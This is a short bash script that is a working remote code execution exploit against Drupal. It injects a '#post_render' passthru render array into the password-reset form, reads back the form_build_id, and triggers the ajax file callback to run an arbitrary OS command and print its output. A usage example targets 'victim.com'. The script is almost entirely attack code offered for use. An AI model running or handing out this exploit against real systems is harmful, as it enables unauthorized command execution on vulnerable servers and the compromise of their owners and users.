#!/bin/bash

# Import required libraries
source /usr/share/bash-completion/bash_completion

# Define variables
target=""
command=""

# Define the exploit function
function exploit {
  local url_target="$1"
  local os_command="$2"
  local parametros='q=user/password&name[#post_render][]=passthru&name[#markup]='"$os_command"'&name[#type]=markup'
  local datos='form_id=user_pass&_triggering_element_name=name'
  local response=$(curl -s -X POST "$url_target" -d "$datos" -G --data-urlencode "$parametros")
  local m=$(echo "$response" | grep -oE '<input type="hidden" name="form_build_id" value="([^"]+)" />' | sed 's/.*value="\([^"]*\)".*/\1/')
  if [[ ! -z "$m" ]]; then
    local parametros='q=file/ajax/name/#value/'"$m"
    local datos='form_build_id='"$m"
    local response=$(curl -s -X POST "$url_target" -d "$datos" -G --data-urlencode "$parametros")
    local salida=$(echo "$response" | cut -d "[" -f1)
    echo "$salida"
  fi
}

# Define the usage function
function usage {
  local comm=$(basename "$0")
  if [[ $(dirname "$0") == $(pwd) ]]; then
    comm="./$comm"
  fi
  cat <<- EOF
  Usage: $comm options

         -h: Url target
         -c: OS command

  Examples:
           $comm -h http://www.victim.com -c 'ls -la'

EOF
}

# Define the start function
function start {
  # Check if enough arguments are provided
  if [[ "$#" -lt 4 ]]; then
    usage
    exit 1
  fi
  # Parse the command line options
  while getopts "h:c:" opt; do
    case $opt in
      h) target=$OPTARG ;;
      c) command=$OPTARG ;;
      \?) usage
          exit 1 ;;
    esac
  done
  # Call the exploit function with the provided options
  exploit "$target" "$command"
  exit 0
}

# Call the start function with the command line arguments
start "$@"
